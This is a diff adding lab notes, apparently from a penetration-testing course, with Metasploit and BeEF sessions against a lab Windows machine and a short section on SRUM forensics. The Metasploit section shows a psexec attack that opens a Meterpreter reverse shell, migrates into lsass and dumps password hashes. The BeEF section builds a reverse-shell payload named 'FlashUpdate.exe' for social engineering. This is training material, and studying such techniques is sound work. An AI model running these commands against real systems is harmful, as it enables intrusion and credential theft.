@@ -2,12 +2,181 @@
 
 ## 4.1 Metasploit
 
+```bash
+# start Metasploit
+msfconsole -q
 
+# searches exploits for psexec
+msf6 > search type:exploit psexec
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/windows/local/current_user_psexec  1999-01-01       excellent  No     PsExec via Current User Token
+   1  exploit/windows/local/wmi                  1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
+   2  exploit/windows/smb/ms17_010_psexec        2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   3  exploit/windows/smb/psexec                 1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
+   4  exploit/windows/smb/webexec                2018-10-24       manual     No     WebExec Authenticated User Code Execution
+
+# select a particular exploit
+msf6 > use exploit/windows/smb/psexec
+
+# shows all options/ params for an exploit
+msf6 exploit(windows/smb/psexec) > show options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass                                no        The password for the specified username
+   SMBUser                                no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+# Configure exploit settings (default payload is reverse shell); RHOSTS = target
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.0.1
+RHOSTS => 10.10.0.1
+msf6 exploit(windows/smb/psexec) > set SMBUSER sec504
+SMBUSER => sec504
+msf6 exploit(windows/smb/psexec) > set SMBPASS sec504
+SMBPASS => sec504
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.75.1
+LHOST => 10.10.75.1
+msf6 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 10.10.75.1:4444 
+[*] 10.10.0.1:445 - Connecting to the server...
+[*] 10.10.0.1:445 - Authenticating to 10.10.0.1:445 as user 'sec504'...
+[*] 10.10.0.1:445 - Selecting PowerShell target
+[*] 10.10.0.1:445 - Executing the payload...
+[+] 10.10.0.1:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 10.10.0.1
+[*] Meterpreter session 1 opened (10.10.75.1:4444 -> 10.10.0.1:1547) at 2022-07-15 16:13:36 +0000
+
+meterpreter > 
+
+# Put meterpreter in bg
+meterpreter > background
+[*] Backgrounding session 1...
+
+# Foreground meterpreter
+msf6 exploit(windows/smb/psexec) > sessions 1
+[*] Starting interaction with 1...
+
+# Execute a command in meterpreter and interact with the output
+meterpreter > execute -if systeminfo
+Process 1852 created.
+Channel 1 created.
+
+Host Name:                 SEC504STUDENT
+OS Name:                   Microsoft Windows 10 Enterprise
+OS Version:                10.0.17134 N/A Build 17134
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00329-10181-97955-AA722
+Original Install Date:     4/1/2019, 1:14:35 AM
+System Boot Time:          7/14/2022, 5:40:12 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual 
+...
+
+# Migrate to processes with access to passwords, then dump passwords
+meterpreter > migrate -N lsass.exe
+[*] Migrating from 2412 to 676...
+[*] Migration completed successfully.
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Sec504:1000:aad3b435b51404eeaad3b435b51404ee:864d8a2947723c4264598997c1d67a83:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9679f78eec859fdedb8c208c8fcf4abf:::
+```
+
+May need to run `exploit` more than once if all settings are valid.
+
+Additional relevant Meterpreter commands:
+
+- getpid: identify our process
+- help: retrieve other commands
+- ps: list running processes
+- getuid: retrieve current user info
+- hashdump: retrieve passwords
+
+Analyze Metasploit attacks with DeepBlueCLI.
 ## 4.2 BeEF
 
+BeEF: tool for exploiting browsers and conducting client-side social engineering attacks.
 
-## 4.3 System Resource Usage Database Analysis
+```bash
+# Make payload
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp /
+lhost=10.10.75.1 lport=4444 -f exe -o /tmp/FlashUpdate.exe
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: /tmp/FlashUpdate.exe
 
+# Setup the reverse shell handler
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.75.1
+LHOST => 10.10.75.1
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.10.75.1:4444
+```
+
+Beef control panel:
+
+![Beef Control](img/lab4/beef1.PNG)
+
+Social engineering presentation to user:
+
+![Social engineering client pov](img/lab4/beef2.PNG)
+
+```bash
+# Proof of exploit
+meterpreter > sysinfo
+Computer        : SEC504STUDENT
+OS              : Windows 10 (10.0 Build 17134).
+Architecture    : x64
+System Language : en_US
+Domain          : SEC504
+Logged On Users : 2
+Meterpreter     : x86/windows
+```
+
+## 4.3 System Resource Usage Database Analysis (srum-dump)
+
+Used to identify anomalous network behavior on a Windows machine.
+
+SRUM database: Windows 8/10 tool used by OS to record detailed info about the system resource utilization.
+
+Location of SRUM data: `C:/Windows/System32/sru/SRUDB.dat`
+
+Some of this information is available from Task Manager
 
 ## 4.4 Command Injection Attack
 
